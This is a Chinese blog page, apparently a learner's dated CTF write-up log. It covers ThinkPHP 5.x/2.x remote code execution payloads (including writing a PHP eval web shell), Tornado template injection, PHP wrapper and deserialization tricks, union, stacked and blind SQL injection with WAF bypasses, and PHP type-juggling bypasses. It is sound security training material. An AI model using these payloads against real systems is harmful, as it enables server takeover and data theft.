src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51904_3.png" alt></p><pre><code>.eJw9kMGKwkAMhl9lydlDnV0vghdpd2ghGSpTy8xFtK22aceFqtQd8d13cMFDICHJ9__JA3bHsbm0sLyOt2YGu66G5QM-DrAELNMF6ppVid7G3wPJba9k1iNvB-JQ-zQiWSzImy_D6SfFbUdlEZGnMLdpKS4iFIk3pQmR3pWuPLkNG59MRqQTSmKrc2Fl1imdR5bxjrx2JGxrufJK94uQdzauByyT4CXoiHwyZdYqaR3J5I7xyRtdrOA5g-oyHnfXn745v08w_vSLfj0gkwu4udLJZLmPwnKwFwQ5Y3SpCBYDqhDots5Mqxeuc_tT8ybRMIx1_t85711owL523RlmcLs04-tvMI_g-QeRUW4a.YIFYNg.6MtE1lVA6UDS3WQgL-7tDF6oph0</code></pre><p>解得：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51907_4.png" alt></p><h2 id="ThinkPHP-5-Rce-1"><a href="#ThinkPHP-5-Rce-1" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p><strong>Thinkphp5 5.0.22/5.1.29远程代码执行漏洞</strong></p><p>thinkphp为php的一个开发框架</p><p>flag在phpinfo中，payload：</p><pre><code>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></pre><p>同时也可以这样：</p><p>将phpinfo换为system</p><p>-1改为：</p><p>1.touch shell.php</p><p>2.echo “<?php @eval(\$_POST['cmd']);?>“ &gt;&gt; fuck.php来实现文件上传</p><h2 id="ThinkPHP-5-0-23-Rce"><a href="#ThinkPHP-5-0-23-Rce" class="headerlink" title="[ThinkPHP]5.0.23-Rce"></a>[ThinkPHP]5.0.23-Rce</h2><p><strong>漏洞范围: &lt;= 5.0.23、&lt;= 5.1.32</strong></p><p>漏洞利用：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A52147_5.png" alt></p><pre><code>修改GET 为POST；添加Content-Type: application/x-www-form-urlencoded_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A52153_6.png" alt></p><pre><code>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=-1</code></pre><h1 id="2021-4-23"><a href="#2021-4-23" class="headerlink" title="2021-4-23"></a>2021-4-23</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>得到的三个页面：</p><p>/flag.txt<br>flag in /fllllllllllllag</p><p>/welcome.txt<br>render</p><p>/hints.txt<br>md5(cookie_secret+md5(filename))</p><p>右键查看源代码：</p><pre><code>&lt;a href=&#39;/file?filename=/flag.txt&amp;filehash=ba37a4275f6ddf86b04f206ba3d7a173&#39;&gt;/flag.txt&lt;/a&gt;&lt;br/&gt;&lt;a href=&#39;/file?filename=/welcome.txt&amp;filehash=b19fea9259deebcc9c37cbf3e229688b&#39;&gt;/welcome.txt&lt;/a&gt;&lt;br/&gt;&lt;a href=&#39;/file?filename=/hints.txt&amp;filehash=fa122b5860e6f12aa608974974e03f80&#39;&gt;/hints.txt&lt;/a&gt;</code></pre><p>看大手子们说render是python的一个渲染函数，他们的url都是由filename和filehash组成，filehash即为他们filename的md5值。</p><p>也就看出来了，源代码里面就是render的一个体现，根据提示2知道filename=/fllllllllllllag.txt同时也就会知道md5值</p><p>知识点：</p><p>关于找cookie_secret，存在msg参数，可以进行模板注入：</p><pre><code>{{}}。尝试了error?msg={{1}}，可以构造一下payload：?msg{{handler.settings}}，来得到cookie_secret</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8823%E6%97%A51456_1.png" alt></p><p>然后通过脚本来实现md5(cookie_secret+md5(filename))</p><pre><code>import hashlibdef md5(s):    md5 = hashlib.md5()    md5.update(s.encode(&quot;utf-8&quot;))#注意encode    return md5.hexdigest()def filehash():    filename = &quot;/fllllllllllllag&quot;    cookie_secret = &quot;372e1e52-7d6f-4c5e-9d9e-9df4d88947b9&quot;    print(md5(cookie_secret + md5(filename)))filehash()</code></pre><p>得到伴随着cookie_secret将/fllllllllllllag，md5处理后的md5值：312923d3a93b268a692e63de56587cd9</p><p>然后取代并访问：</p><pre><code>http://5b834ffd-6390-4d10-a586-d13b008b2da7.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=312923d3a93b268a692e63de56587cd9</code></pre><p>得到flag</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>考点：</p><p>1.php伪协议的利用</p><p>2.php反序列化操作</p><p>知识点：</p><p><a href="https://www.jianshu.com/p/0a8339fcc269" target="_blank" rel="noopener">PHP伪协议在CTF中的应用</a></p><p>1.关于data://的伪协议利用</p><p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输<br>比如：<br>通过data://text/plain协议来进行漏洞利用。<br>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br>url=data://text/plain,<?php print_r(glob("*")); ?></p><p>2.php://filter的利用</p><p>?file=php://filter/read=convert.base64-encade/resource=useless.php</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><h3 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h3><h4 id="1-代码审计："><a href="#1-代码审计：" class="headerlink" title="1.代码审计："></a>1.代码审计：</h4><pre><code>&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)){    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file)){        echo &quot;Not now!&quot;;        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt;</code></pre><h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><p>要求传入的text中含有welcome to the zjctf字段，同时保证为一个文本文件，所以考点就是data://text/plain；紧接着构造参数：</p><pre><code>/?text=data://text/plain,welcome to the zjctf</code></pre><p>或者：</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>此种情况是为了防止过滤</p><h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><p>过滤掉传入file参数中的flag，同时给出提示//useless.php，得知运用include的话就可以利用php://input伪协议来实现文件读取（这里很明显需要读取文件），构造参数：</p><pre><code>&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>二者联合得：</p><pre><code>/?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><p>针对得到的useless.php的base64进行解码得到：</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  ?&gt;  </code></pre><p>他指引我们去给file赋值为flag.php</p><p>本地进行序列化：</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file = &quot;flag.php&quot;;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  $a = new Flag();echo serialize($a);?&gt;  </code></pre><p>得到：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><h5 id="最后一步："><a href="#最后一步：" class="headerlink" title="最后一步："></a>最后一步：</h5><p>整合payload</p><pre><code>/?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>右键源代码即可得到flag</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><pre><code>import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#39;utf-8&#39;)  # 改变标准输出的默认编码,否则s.text不能输出x = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload = {    &quot;id&quot;: &quot;&quot;}for i in range(0, 60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot; % (str(i), ord(j))        s = requests.post(url, data=payload)        # print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><h3 id="脚本的解释："><a href="#脚本的解释：" class="headerlink" title="脚本的解释："></a>脚本的解释：</h3><h4 id="payload-“id”-的来源："><a href="#payload-“id”-的来源：" class="headerlink" title="payload[“id”]的来源："></a>payload[“id”]的来源：</h4><p>post提交需要传入的参数为id</p><h4 id="关于1-1的优先运算："><a href="#关于1-1的优先运算：" class="headerlink" title="关于1=()=1的优先运算："></a>关于1=()=1的优先运算：</h4><p>1=(if(1&gt;0))=1这样会正常回显</p><p>1=(if(1&lt;0))=1这样不会正常回显</p><p>一个运算结果为true，一个为false</p><p>第一个1与if函数返回的值进行判断，会得到1或者0，为了确保返回值一定为true，所以再与后面的1（true）再来一次确定性质的判断</p><p>第二次的=是为了保证第一次的事件成立后再执行</p><p>跟高中数学的概率一样</p><p>保证a事件发生的前提下发生b事件</p><h4 id="if-“Hello”-in-s-text"><a href="#if-“Hello”-in-s-text" class="headerlink" title="if “Hello” in s.text:"></a>if “Hello” in s.text:</h4><p>因为返回正确的时候才会显hello</p><h2 id="ThinkPHP-2-Rce"><a href="#ThinkPHP-2-Rce" class="headerlink" title="[ThinkPHP]2-Rce"></a>[ThinkPHP]2-Rce</h2><p>ThinkPHP 2.x 的任意代码执行漏洞</p><p>题目：</p><pre><code>示例源码控制器IndexAction类&lt;?phpclass IndexAction extends Action{    public function index() {        $this-&gt;assign(&#39;hello&#39;,&#39;Hello,ThinkPHP&#39;);        $this-&gt;display();    }}?&gt; </code></pre><p>payload：</p><pre><code>?s=/Index/index/L/${@phpinfo()}</code></pre><h1 id="2021-4-24"><a href="#2021-4-24" class="headerlink" title="2021-4-24"></a>2021-4-24</h1><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>知识点：</p><p>1.联合查询</p><p>2.php反序列化</p><p>登陆后有三栏，username，age，blog，查看源代码：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8824%E6%97%A50928_1.png" alt></p><p>发现这里用data://伪协议会输出一些东西，那么肯定就是flag</p><p>又因为此页面存在sql注入点，sqlmap跑不动，也可能是我不会使。。。</p><p>可以用sqlfuzz小字典跑一下，但是我有wp我就不跑了。。。</p><p>payload如下：</p><p>绕过waf的姿势：</p><pre><code>union all selectunion/**/select/*!union*/ select</code></pre><pre><code>?no=1 and 1=1#整数型啊，很好?no=1 order by 4#有4列?no=1 order by 5#报错?no=-1 union/**/select 1,2,3,4#?no=-1 union/**/select 1,database(),3,4#库名：fakebook?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;#表明：users?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS?no=-1 union/**/select 1,group_concat(no,&#39;**&#39;,username,&#39;**&#39;,passwd,&#39;**&#39;,data),3,4 from fakebook.users#</code></pre><p>最终得到：</p><p>no：1</p><p>username：test</p><p>passwd：cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e</p><p>data：O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:123;s:4:”blog”;s:7:”123.com”;}</p><p>并显示报错：</p><p><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong></p><p>也就是说data可以传入反序列化，有序列化就会有源码，备份字典跑一下，得到robots.txt：</p><p>User-agent: *<br>Disallow: /user.php.bak</p><p>user.php内容：<a href="https://blog.csdn.net/qq_43622442/article/details/105633194" target="_blank" rel="noopener">这篇文章对该序列化进行了很好的解释</a></p><pre><code>&lt;?phpclass UserInfo{    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    {        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    }    function get($url)    {        # curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。        $ch = curl_init();        # curl_setopt ： 请求一个url。其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。        curl_setopt($ch, CURLOPT_URL, $url);          # CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);           # curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。        $output = curl_exec($ch);        # CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        #如果状态码不是404，就返回exec的结果。        if($httpCode == 404) {            return 404;        }        curl_close($ch);        return $output;    }    public function getBlogContents ()    {        return $this-&gt;get($this-&gt;blog);    }    public function isValidBlog ()    {        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    }}</code></pre><p>本地序列化：</p><pre><code>&lt;?phpclass UserInfo{    public $name = &quot;test&quot;;    public $age = 123;    public $blog = &quot;file:///var/www/html/flag.php&quot;;#访问请求一下判断是否存在}$a = new UserInfo();echo serialize($a);?&gt;</code></pre><p>得到：O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:123;s:4:”blog”;s:22:”file:///var/www/html/flag.php”;}</p><p>利用注入将数据传入进去：</p><pre><code>?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;#</code></pre><p>f12可以之间看见，右键源代码则需要base64再解密</p><p>解法二：利用没被过滤的函数load_file()</p><p>payload:</p><pre><code>?no=-1 union/**/select 1,load_file(&#39;/var/www/html/flag.php&#39;),3,4</code></pre><h1 id="2021-4-25"><a href="#2021-4-25" class="headerlink" title="2021-4-25"></a>2021-4-25</h1><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>先扫盲：</p><p><a href="https://www.w3school.com.cn/php/func_string_ord.asp" target="_blank" rel="noopener">PHP ord() 函数</a>其返回值为ASCII码</p><p>file_put_contents() 函数把一个字符串写入文件中，如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p><p>=== 需要值和其所属的类型都符合要求 ‘2’ === 2 false</p><p>== 值符合要求即可 ‘2’ == 2 true</p><p>题目：</p><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler {    protected $op;    protected $filename;    protected $content;    function __construct() {        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    }    public function process() {        if($this-&gt;op == &quot;1&quot;) {            $this-&gt;write();        } else if($this-&gt;op == &quot;2&quot;) {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output(&quot;Bad Hacker!&quot;);        }    }    private function write() {        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {            if(strlen((string)$this-&gt;content) &gt; 100) {                $this-&gt;output(&quot;Too long!&quot;);                die();            }            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        } else {            $this-&gt;output(&quot;Failed!&quot;);        }    }    private function read() {        $res = &quot;&quot;;        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }    private function output($s) {        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    }    function __destruct() {        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    }}function is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;}if(isset($_GET{&#39;str&#39;})) {    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) {        $obj = unserialize($str);    }}</code></pre><p>首先，这里面在传入反序列化后的参数会被调用到的函数只有</p><p>__construct()：当一个对象创建时被调用</p><p>__destruct()：当一个对象销毁时被调用</p><h3 id="1-绕过is-valid-函数"><a href="#1-绕过is-valid-函数" class="headerlink" title="1.绕过is_valid()函数"></a>1.绕过is_valid()函数</h3><p>函数is_valid($s)对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true，也就是这里：</p><pre><code>if(is_valid($str)) {        $obj = unserialize($str);    }</code></pre><p>绕过方法：</p><p>针对与protected类型和private类型的属性存在不可打印字符：</p><p>protect分析：</p><pre><code>本来是sex结果上面出现的是*sex，而且*sex的长度是4，但是上面显示的是6，同样查找资料后发现protect属性序列化的时候格式是%00*%00sex(成员名)</code></pre><p>private分析：</p><pre><code>这样就发现本来是age结果上面出现的是testage，而且testage长度为7，但是上面显示的是9查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以age加了类名后变成了%00test%00age长度为9</code></pre><p>那么这里如果传出，对照<a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ASCII码表</a>32-125被定义为可显示字符，但是%00为认定为只占一个字符，所以不在32-125的队伍中，故必须修改成员属性为public，但是这里有给前提就是：<strong>PHP7.1以上版本对属性类型不敏感</strong>，所以才可以实现</p><p>7.1以下的绕过姿势：</p><p>当我们将不论是带有protected还是private的成员属性时：</p><pre><code>O:11:&quot;FileHandler&quot;:3:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:7:&quot;oavinci&quot;;}</code></pre><p>只要将代表字符串个数的的s改为大写S，就可以实现将%00用16进制编码表示，变成00</p><h3 id="2-利用-destruct-来实现read-方法的调用"><a href="#2-利用-destruct-来实现read-方法的调用" class="headerlink" title="2.利用__destruct()来实现read()方法的调用"></a>2.利用__destruct()来实现read()方法的调用</h3><p>问题1：为什么非要调用read()方法</p><p>回答1：对比write()与read()</p><pre><code> private function write() {        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {            if(strlen((string)$this-&gt;content) &gt; 100) {                $this-&gt;output(&quot;Too long!&quot;);                die();            }            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        } else {            $this-&gt;output(&quot;Failed!&quot;);        }    }</code></pre><p>首先需要设置成员filename和content，然后判断content不能的字符串不能大于100，然后再将content的内容写入到我传入的filename的文件中，然后通过判断res的类型来执行output方法，但是如果按照这个逻辑的话，那么flag这辈子是出不来了，得到的结果要么successful，要么是failed，所以不可能是通过write方法了</p><p>问题2：那么如何调用read()方法呢？</p><p>回答2：利用可以调用的__destruct()来实现read()方法的调用</p><pre><code> function __destruct() {        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    }</code></pre><p>===很扎眼，考点为弱类型，如果op=一个字符型的2那么就把2变成1，然后调用process()方法：</p><pre><code>public function process() {        if($this-&gt;op == &quot;1&quot;) {            $this-&gt;write();        } else if($this-&gt;op == &quot;2&quot;) {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output(&quot;Bad Hacker!&quot;);        }    }</code></pre><p>首先在刚才就被我们否定的write()函数，是绝对不能用的，所以op绝对不可以=1，所以想要保住op=2的前提下又绕过__destruct()函数，就要使用弱类型来实现，也就是说：</p><p>if($this-&gt;op == “2”) 这里的2可是整数型，可以是字符型，都返回true</p><p>if($this-&gt;op === “2”) 这里的2如果是整数型则返回false，只有字符型的时候才返回true</p><p>这样就可以给$op传入整数型2的值来实现即绕过了__destruct()函数，又能保证执行read()方法</p><pre><code>private function read() {        $res = &quot;&quot;;        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }</code></pre><p>最后一个考点就是在遇到这个file_get_contents()函数的时候，结合php://filter/read=convert.base64-encode/resource=flag.php,等各种伪协议绕过姿势(我没有试)</p><p>然后可以本地环境来实验了：</p><pre><code>&lt;?phpclass FileHandler {    public $op = 2;    public $filename = &quot;flag.php&quot;;    public $content;    }$a = new FileHandler();echo serialize($a);?&gt;</code></pre><p>构造payload：</p><pre><code>?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;}</code></pre><p>右键查看源代码得到flag</p><h1 id="2021-4-27"><a href="#2021-4-27" class="headerlink" title="2021-4-27"></a>2021-4-27</h1><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>题目源代码</p><pre><code>&lt;?phpinclude &#39;flag.php&#39;;$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) {    $id=$_GET[&#39;id&#39;];    $gg=$_GET[&#39;gg&#39;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) {        echo &#39;You got the first step&#39;;        if(isset($_POST[&#39;passwd&#39;])) {            $passwd=$_POST[&#39;passwd&#39;];            if (!is_numeric($passwd))            {                 if($passwd==1234567)                 {                     echo &#39;Good Job!&#39;;                     highlight_file(&#39;flag.php&#39;);                     die(&#39;By Retr_0&#39;);                 }                 else                 {                     echo &quot;can you think twice??&quot;;                 }            }            else{                echo &#39;You can not get it !&#39;;            }        }        else{            die(&#39;only one way to get the flag&#39;);        }}    else {        echo &quot;You are not a real hacker!&quot;;    }}else{    die(&#39;Please input first&#39;);}}?&gt;</code></pre><p>第一步绕过：</p><pre><code> if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) </code></pre><p>利用数组绕过：</p><pre><code>?gg[]=1&amp;id[]=2</code></pre><p>第二步绕过：</p><pre><code>if (!is_numeric($passwd))            {                 if($passwd==1234567)</code></pre><p>payload：</p><pre><code>passwd=1234567e</code></pre><p>然后得到flag</p><p>大佬的博客：<a href="https://www.ghtwf01.cn/index.php/archives/777/" target="_blank" rel="noopener">PHP弱类型及相关函数Bypass</a></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>注入题目，先sqlfuzz一下，看响应里面有提示：</p><p>preg_match(“/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i”,$inject);</p><p>另外这个网站有防sqlmap就别想sqlmap了！</p><p>堆叠注入了，跟强网杯的随便注一个模板，同时也过滤了很多</p><p>payload：</p><pre><code>1&#39;;show tables;#</code></pre><p>得到表明：FlagHere</p><pre><code>1&#39;;show columns from FlagHere;#</code></pre><p>得到列名：flag</p><p>利用报错注入得到库名：supersqli</p><pre><code>-1&#39; or extractvalue(1,concat(&#39;~&#39;,database()))#</code></pre><p>新考点学习：<a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">mysql中的HANDLER … OPEN语句</a></p><p>payload：</p><pre><code>1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code></pre><p>得到flag</p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><pre><code>&lt;?phpif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];}if(!isset($_GET[&#39;host&#39;])) {    highlight_file(__FILE__);} else {    $host = $_GET[&#39;host&#39;];    $host = escapeshellarg($host);    $host = escapeshellcmd($host);    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo &#39;you are in sandbox &#39;.$sandbox;    @mkdir($sandbox);    chdir($sandbox);    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);}</code></pre><h3 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h3><h4 id="escapeshellarg函数："><a href="#escapeshellarg函数：" class="headerlink" title="escapeshellarg函数："></a>escapeshellarg函数：</h4><p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)</p><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数；</p><p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">执行运算符</a> 。</p><p>例子：</p><pre><code>&lt;?phpsystem(&#39;ls &#39;.escapeshellarg($dir));?&gt;</code></pre><h3 id="escapeshellcmd函数："><a href="#escapeshellcmd函数：" class="headerlink" title="escapeshellcmd函数："></a>escapeshellcmd函数：</h3><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p>escapeshellcmd — shell 元字符转义</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 